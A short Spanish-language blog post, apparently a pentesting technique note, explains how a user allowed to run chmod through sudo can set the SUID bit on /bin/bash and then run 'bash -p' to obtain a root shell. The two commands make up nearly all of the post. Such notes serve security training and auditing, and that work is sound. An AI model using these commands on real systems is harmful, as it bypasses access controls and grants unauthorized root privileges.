---
layout: single
title:  Chmod - Privilege Escalation 
excerpt: "Guia de como escalar privilegios cuando se puede ejecutar chmod como Sudo"
date: 2022-10-27
classes: wide
header:
  teaser: /assets/images/chmodPrivilege/logo.png
  teaser_home_page: true
categories:
  - Tecnicas
tags:
  - Escalada de Privilegios
  - Sudo
---

Si vemos que el usuario que estamos usando, puede ejecutar chmod como sudo, lo que habría que hacer sería lo siguiente:

``sudo -u root chmod 4577 /bin/bash``

![](/assets/images/chmodPrivilege/ch1.jpg)

luego solo habría que hacer un `bash -p`

![](/assets/images/chmodPrivilege/ch2.jpg)

